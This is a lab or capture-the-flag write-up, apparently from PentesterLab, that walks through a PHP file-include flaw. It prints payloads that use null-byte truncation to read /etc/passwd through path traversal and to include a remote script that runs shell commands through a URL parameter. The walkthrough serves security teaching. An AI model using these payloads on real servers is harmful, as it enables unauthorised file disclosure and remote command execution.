## Solution
1. Visiting the web-page and looking at the URL, I added a `single-quote (')` to the end of the URL.
2. Looking at the error I got with `include()`
```php
Warning: include(intro'.php): failed to open stream: No such file or directory in /var/www/index.php on line 17

Warning: include(): Failed opening 'intro'.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index.php on line 17
The objective of this exercise is to find the File Include vulnerability in this page.
```
3. If you notice the error closely, you can see that this time the `single-quote` is before `.php` and it's not even present in the URL.
4. So, the server takes our string and adds `.php` to it and tries to load that file.
5. When an application is adding such suffixes, the first thing to try is to add a `NULL BYTE` because that is going to finish the string and everything that is after that will be ignored.
6. So when we add a NULL byte to the end intro, we get an error this is because intro doesnt exists, what exists is `intro.php` so we can use the following
```
?page=intro.php%00
```
7. In the similar way, we can load the `/etc/passwd` file by adding the NULL byte at the end.
```
?page=../../../etc/passwd%00
```
8. To load our malicious payload provided in the previous exercise, we also need to use the NULL byte.
```
?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=id
```
9. We can finish the exercise by replacing the `id` command with the `score` command
